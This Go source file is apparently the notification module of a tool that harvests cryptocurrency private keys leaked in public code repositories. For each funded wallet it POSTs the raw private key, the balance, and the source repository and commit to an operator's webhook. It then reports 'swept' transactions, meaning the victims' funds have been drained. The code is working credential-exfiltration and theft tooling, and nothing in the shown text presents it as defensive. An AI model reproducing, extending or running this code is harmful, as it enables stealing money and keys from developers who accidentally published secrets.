package main

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"time"
)

type webhookPayload struct {
	Type         string `json:"type"` // "funded" or "swept"
	Chain        string `json:"chain"`
	Address      string `json:"address"`
	BalanceHuman string `json:"balance_human"`
	RawKey       string `json:"private_key,omitempty"`
	SourceRepo   string `json:"source_repo"`
	SourceCommit string `json:"source_commit"`
	TxHash       string `json:"tx_hash,omitempty"`
	SweepError   string `json:"sweep_error,omitempty"`
	Timestamp    string `json:"timestamp"`
}

func notify(ctx context.Context, key FoundKey, b BalanceResult, webhookURL string) {
	payload := webhookPayload{
		Type:         "funded",
		Chain:        b.Chain,
		Address:      b.Address,
		BalanceHuman: b.BalanceHuman,
		RawKey:       key.Raw,
		SourceRepo:   key.Repo,
		SourceCommit: key.CommitSHA,
		Timestamp:    time.Now().UTC().Format(time.RFC3339),
	}
	sendNotify(ctx, payload, webhookURL)
}

func notifySwept(ctx context.Context, key FoundKey, b BalanceResult, txHash string, sweepErr string, webhookURL string) {
	sweptURL := strings.Replace(webhookURL, "/funded", "/swept", 1)
	payload := webhookPayload{
		Type:         "swept",
		Chain:        b.Chain,
		Address:      b.Address,
		BalanceHuman: b.BalanceHuman,
		SourceRepo:   key.Repo,
		SourceCommit: key.CommitSHA,
		TxHash:       txHash,
		SweepError:   sweepErr,
		Timestamp:    time.Now().UTC().Format(time.RFC3339),
	}
	sendNotify(ctx, payload, sweptURL)
}

func sendNotify(ctx context.Context, payload webhookPayload, webhookURL string) {
	body, err := json.Marshal(payload)
	if err != nil {
		logger.Printf("[notify] marshal error: %v", err)
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, webhookURL, bytes.NewReader(body))
	if err != nil {
		logger.Printf("[notify] request error: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		logger.Printf("[notify] POST error: %v", err)
		return
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if resp.StatusCode >= 300 {
		logger.Printf("[notify] webhook returned %d: %s", resp.StatusCode, string(respBody))
		return
	}
}
